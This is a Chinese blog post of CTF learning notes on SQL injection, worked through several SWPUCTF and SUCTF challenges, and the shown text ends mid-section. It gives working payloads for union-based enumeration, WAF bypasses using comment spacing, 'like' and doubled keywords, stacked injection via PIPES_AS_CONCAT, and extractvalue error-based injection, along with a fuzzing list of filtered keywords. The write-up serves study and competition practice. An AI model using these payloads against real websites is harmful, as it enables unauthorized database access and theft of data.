<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="sql注入进阶初级, wuk0Ng">
    <meta name="description" content="wuk0Ng的个人博客">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>sql注入进阶初级 | wuk0Ng</title>
    <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 7.3.0"></head>



   <style>
    body{
       background-image: url(/medias/my_background.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/jiushen.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">wuk0Ng</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/jiushen.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">wuk0Ng</div>
        <div class="logo-desc">
            
            wuk0Ng的个人博客
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/web-wuk0Ng" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/web-wuk0Ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">sql注入进阶初级</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/sql%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0/">
                                <span class="chip bg-color">sql进阶学习</span>
                            </a>
                        
                            <a href="/tags/ctf%E8%B5%9B%E9%A2%98/">
                                <span class="chip bg-color">ctf赛题</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
                                记录
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-05-09
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>事情起因是学长除了盲注加waf，我没有做出来，所以来补一下sql的很多相关知识<br>这也知识初步，因为，很多是第一次遇见，我没有自己手搓，没有自己手写脚本，等后面再学一次，自己手搓，不看wp来自己做一下。这样才能找到问题<br>借助大量的题目，一是方便理解，二是能够更好地在比赛中借助笔记解决出来问题，还有就是回顾一些赛题和融汇贯通sql注入的各类思想</p>
<h1 id="最常规"><a href="#最常规" class="headerlink" title="最常规"></a>最常规</h1><p>这里的最常规是指没waf，注入手法是最经典的注入。这里很多较为复杂的其他情况我们先不考虑<br>例题：[SWPUCTF 2021 新生赛]easy_sql<br>首先进去告诉你了参数wllm</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1</span><br></pre></td></tr></table></figure>
<p>回显：Your Login name:xxx<br>Your Password:yyy<br>各人这里推荐先测试闭合符。数字型就不用管闭合符了，但是这种情况遇到的比较少，同时很多时候会将空格给过滤了，你一来就1 and 1&#x3D;2，那你怎么知道是过滤了空格还是and等等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1&#x27;</span><br></pre></td></tr></table></figure>
<p>回显：You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1<br>就是一个报错<br>我们接下来测试注释符号，有很多种，–+,%23,#<br>推荐使用后面两个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1&#x27;%23</span><br></pre></td></tr></table></figure>
<p>又开始了正常回显</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1&#x27; order by 4%23</span><br></pre></td></tr></table></figure>
<p>3正常，4报错<br>得知共有三列，第一列是数字123456等等，二三列不知<br>接下来我们将1改为-1，有些时候得是0，这样才能够正常回显<br>以及我们在这里需要简单测试一下我们的回显位置，1，2，3哪个改为我们的database()才能拿到结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,3%23</span><br></pre></td></tr></table></figure>
<p>回显：Your Login name:2<br>Your Password:3<br>这里我们得知2，3都是可以的<br>3改为database()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,database()%23</span><br></pre></td></tr></table></figure>
<p>回显：Your Login name:2<br>Your Password:test_db<br>数据库名为：test_db<br>当然，前面的是最简单的一种情况，因为可能flag不在当前的数据库里面，我们有时候需要得到所有的数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=0&#x27;union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
<p>回显：Your Login name:information_schema,mysql,performance_schema,test,test_db<br>information_schema.schemata 是 information_schema 下的一个表，用于列出当前数据库服务器上所有的数据库（schema）名称<br>接下来就是我们的表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=0&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;--+</span><br></pre></td></tr></table></figure>
<p>这里加上group_concat,就会回显两个表，没有加上就回显一个表<br>这里回顾一下几个函数的用法<br>group_concat：用于一次性输出多个字段或多行数据<br>table_name:表名<br>information_schema.tables：包含所有mysql数据库的简要信息，包含两个数据表：tables表名集合表，columns列名集合表<br>table_schema：table_schema 在 SQL 注入中常用于 筛选特定数据库中的表或字段，它是 information_schema 数据库中 tables 和 columns 表里的一个字段，表示某个表或字段所属的数据库名<br>回显：Your Password:test_tb,users<br>接下来就是列名以及拿到flag了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=0&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;test_tb&#x27;--+</span><br></pre></td></tr></table></figure>
<p>这里的’test_db’换为database()也是一样的回显<br>因为你已经限制表的名字了，还管库的嘛</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-2&#x27; union select 1,2,group_concat(id,flag) from test_tb--+</span><br></pre></td></tr></table></figure>
<p>最后这个拿到flag<br>写到这里，算是搞懂了以前很多模糊不清的东西，后面的也是。是一种融汇贯通，也是弄清楚很多基础的东西，更是一种回顾题目，最后就是一个进阶</p>
<h1 id="稍微进阶"><a href="#稍微进阶" class="headerlink" title="稍微进阶"></a>稍微进阶</h1><p> [SWPUCTF 2021 新生赛]sql<br>空格绕过关键字绕过SQL注入<br>第一步的输入正常参数：?wllm&#x3D;1<br>回显：Your Login name:xxx<br>Your Password:yyy<br>我们在这里开始尝试，就像上面说的，我们先开始测试闭合符等等，这样的话不测试空格和and比较方便让我们来得知是过滤了什么<br>?wllm&#x3D;1’%23<br>先报错，后正常回显。得知闭合符和我们的注释符<br>我们这里试着来group by和order by发现这里都不行，应该是有一个过滤空格的<br>这个符号来替换呗过滤掉了的空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/</span><br></pre></td></tr></table></figure>
<p>?wllm&#x3D;1’order&#x2F;<strong>&#x2F;by&#x2F;</strong>&#x2F;4%23<br>4开始报错，3没有问题<br>or应该是也没有过滤的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,2,3%23</span><br></pre></td></tr></table></figure>
<p>第二个空格不可以少，我们这样就穿过了一个waf了，得到正常回显<br>Your Login name:2<br>Your Password:3<br>3换成database()得到正常回显的数据库test_db<br>后面就还有一个waf就是我们&#x3D;号<br>等于号换成我们的like，这一点我不是很熟悉，稍微多注意一些</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like&#x27;test_db&#x27;%23</span><br></pre></td></tr></table></figure>
<p>回显：LTLT_flag,users<br>这个我就看到一个东西，也就是我们上面的一个细节，我已经拿到表名了，我在查列的时候就不要再加上我们的库名了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=0&#x27;union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23</span><br></pre></td></tr></table></figure>
<p>拿到列名：id,flag<br>这道题我刚才测试了一下，就是过滤了and<br>我试着饶一下<br>And 和or 过滤绕过：<br>1.使用大小写绕过anD<br>2.复写过滤绕过：？Id&#x3D;1 ‘anandd 1&#x3D;1 –+<br>3.用&amp;&amp;取代and，用||取代or<br>可以用%26代替&amp;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=0&#x27;union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;/**/%26%26/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23</span><br></pre></td></tr></table></figure>
<p>所以这个也可以拿到列名<br>最后来拿到flag，这个最后只是拿到一部分的flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-2&#x27;/**/union/**/select/**/1,2,group_concat(id,flag)/**/from/**/LTLT_flag%23</span><br></pre></td></tr></table></figure>
<p>使用截断函数进行绕过，substr，right，REVERSE 被过滤（测试出来的），只能用mid<br>mid截取，因为回显只能有20个，所以20，一组截取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27;union/**/select/**/1,2,mid(group_concat(flag),1,20)/**/from/**/test_db.LTLT_flag%23</span><br></pre></td></tr></table></figure>
<p>需要读三组，最后拿到flag</p>
<h1 id="SWPUCTF-2022-新生赛-ez-sql"><a href="#SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_sql"></a>[SWPUCTF 2022 新生赛]ez_sql</h1><p>这个也是过滤空格和双写一个or就可以了</p>
<h1 id="suctf-2019-EasySQL"><a href="#suctf-2019-EasySQL" class="headerlink" title="[suctf 2019]EasySQL"></a>[suctf 2019]EasySQL</h1><p>这是一个堆叠注入的题目，原来我早早就遇见过了堆叠注入了<br>这个不是最常规的堆叠注入的题目<br>可以看源码知道是post传参，还有抓包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28261</span><br><span class="line">Content-Length: 7</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://node4.anna.nssctf.cn:28261</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://node4.anna.nssctf.cn:28261/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=43078005e206d1ec15953d666b771005</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">query=1</span><br></pre></td></tr></table></figure>
<p>知道，我们传入的参数1是前面有一个query的就可以了<br>输入1有正常回显，但是我们输入1 or 1&#x3D;1回显nonono<br>这里是有很强的暗示性的，不回显那基本就是错了，nonono一般就是有waf<br>我们进行抓包，可以利用关键字进行爆破，可以知道它过滤了什么<br>我本地长度是510的，就是和or长度一样的，就是被过滤的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">4	handler	200	false	false	510	</span><br><span class="line">5	like	200	false	false	510	</span><br><span class="line">6	LiKe	200	false	false	510	</span><br><span class="line">9	sleep	200	false	false	510	</span><br><span class="line">10	SLEEp	200	false	false	510	</span><br><span class="line">13	delete	200	false	false	510	</span><br><span class="line">15	or	200	false	false	510	</span><br><span class="line">16	oR	200	false	false	510	</span><br><span class="line">27	insert	200	false	false	510	</span><br><span class="line">28	insERT	200	false	false	510	</span><br><span class="line">29	INSERT	200	false	false	510	</span><br><span class="line">33	INFORMATION	200	false	false	510	</span><br><span class="line">39	xor	200	false	false	510	</span><br><span class="line">48	AND	200	false	false	510	</span><br><span class="line">49	ANd	200	false	false	510	</span><br><span class="line">57	CREATE	200	false	false	510	</span><br><span class="line">63	&quot;	200	false	false	510	</span><br><span class="line">75	union	200	false	false	510	</span><br><span class="line">76	UNIon	200	false	false	510	</span><br><span class="line">77	UNION	200	false	false	510	</span><br><span class="line">78	&quot;	200	false	false	510	</span><br><span class="line">79	&amp;	200	false	false	510	</span><br><span class="line">80	&amp;&amp;	200	false	false	510	</span><br><span class="line">82	oorr	200	false	false	510	</span><br><span class="line">88	anandd	200	false	false	510	</span><br><span class="line">91	IF	200	false	false	510	</span><br><span class="line">97	sleep	200	false	false	510	</span><br><span class="line">98	LIKE	200	false	false	510	</span><br><span class="line">105	infromation_schema	200	false	false	510	</span><br><span class="line">107	OR	200	false	false	510	</span><br><span class="line">108	ORDER	200	false	false	510	</span><br><span class="line">109	ORD	200	false	false	510	</span><br><span class="line">115	UNION	200	false	false	510	</span><br><span class="line">116	UPDATE	200	false	false	510	</span><br><span class="line">122	WHERE	200	false	false	510	</span><br><span class="line">124	AND	200	false	false	510	</span><br><span class="line">125	prepare	200	false	false	510	</span><br><span class="line">127	update	200	false	false	510	</span><br><span class="line">128	delete	200	false	false	510	</span><br><span class="line">129	drop	200	false	false	510	</span><br><span class="line">136	CREATE	200	false	false	510	</span><br><span class="line">140	DELETE	200	false	false	510	</span><br><span class="line">141	DROP	200	false	false	510	</span><br><span class="line">142	floor	200	false	false	510	</span><br><span class="line">143	rand()	200	false	false	510	</span><br><span class="line">144	information_schema.tables	200	false	false	510	</span><br><span class="line">150	ORD	200	false	false	510	</span><br><span class="line">152	extractvalue	200	false	false	510	</span><br><span class="line">153	order 	200	false	false	510	</span><br><span class="line">156	ORDER	200	false	false	510	</span><br><span class="line">157	OUTFILE	200	false	false	510	</span><br><span class="line">163	updatexml	200	false	false	510	</span><br><span class="line">171	format	200	false	false	510	</span><br><span class="line">174	ord	200	false	false	510	</span><br><span class="line">176	UPDATE	200	false	false	510	</span><br><span class="line">181	WHERE	200	false	false	510	</span><br><span class="line">191	for	200	false	false	510	</span><br><span class="line">192	BEFORE	200	false	false	510	</span><br><span class="line">193	REGEXP	200	false	false	510	</span><br><span class="line">194	RLIKE	200	false	false	510	</span><br><span class="line">197	SEPARATOR	200	false	false	510	</span><br><span class="line">198	XOR	200	false	false	510	</span><br><span class="line">199	CURSOR	200	false	false	510	</span><br><span class="line">200	FLOOR	200	false	false	510	</span><br><span class="line">205	from	200	false	false	510	</span><br><span class="line">213	%22	200	false	false	510	</span><br></pre></td></tr></table></figure>
<p>有from,update呀等等<br>由此观之，报错注入，union联合注入，盲注皆不可行，所以我们尝试进行堆叠注入<br>不是题目直接告诉你用堆叠注入的话，我们应该先试着来看看过滤了什么，再考虑用什么方式来注入<br>开始试探：这里我就不试探了<br>爆库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1; show databases;</span><br></pre></td></tr></table></figure>
<p>中间空格无所谓<br>回显：Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; ctf ) Array ( [0] &#x3D;&gt; ctftraining ) Array ( [0] &#x3D;&gt; information_schema ) Array ( [0] &#x3D;&gt; mysql ) Array ( [0] &#x3D;&gt; performance_schema ) Array ( [0] &#x3D;&gt; test )<br>爆表：1;show tables;<br>回显：Array ( [0] &#x3D;&gt; 1 ) Array ( [0] &#x3D;&gt; Flag )<br>输入1有回显，输入0没有回显，abc输入也没有回显<br>回显的结果：Array ( [0] &#x3D;&gt; 1 )<br>只有这个（只是常规注入下哦）<br>或者没有回显<br>我们由此可以猜测后端代码含有 ||或运算符。<br>补充：|| 或or 运算符讲解：</p>
<p>select command1 || command2 </p>
<p>情况一：若command1为非0数字，则结果为1。</p>
<p>情况二：若command1为0或字母，command2为非0数字，则结果为1。</p>
<p>情况三：command1和command2都不为非0数字，则结果为0。</p>
<p>通过以上分析，我们可以判断后端代码中存在或运算符。</p>
<p>查看本题的后端代码，事实与我们的判断相吻合。</p>
<p>$sql &#x3D; “select “.$post[‘query’].”||flag from Flag”;<br>预期解法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">方法一：使用 sql_mode 中的 PIPES_AS_CONCAT 函数。</span><br><span class="line"></span><br><span class="line">PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。</span><br><span class="line"></span><br><span class="line">select 1 || flag from Flag的意思将变成 先查询1 再查询 flag，而不是查询1flag,只是查询的结果会拼接到一起，不要弄混淆了。</span><br><span class="line"></span><br><span class="line">所以查询语句如下：</span><br><span class="line"></span><br><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
<p>最后就可以拿到flag了</p>
<h1 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h1><p>报错注入SQL注入布尔盲注<br>这里告诉你了，要用报错注入，这里我们就思考一个问题，什么情况下要用，为什么要用<br>这里我们先常规注入，这里先1’#<br>得到了闭合符和注释符<br>分别输入1’ order by 3#和1’ order by 4#判断列数为3<br>注意这里，我们在1’ order by 3#<br>回显：id：1’ order by 3#<br>没有提示………..<br>开始注入<br>1’ union select 1,2,3#</p>
<p>id：1’ union select 1,2,3#<br>没有提示………..<br>我们这里的是没有回显的，加上刚才我们前面的1’–+这些测试，都可以大概知道了，这道题目要用报错注入<br>查库名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select database()))))#</span><br></pre></td></tr></table></figure>
<p>查表名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;and(select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;))))#</span><br></pre></td></tr></table></figure>
<p>列名：</p>
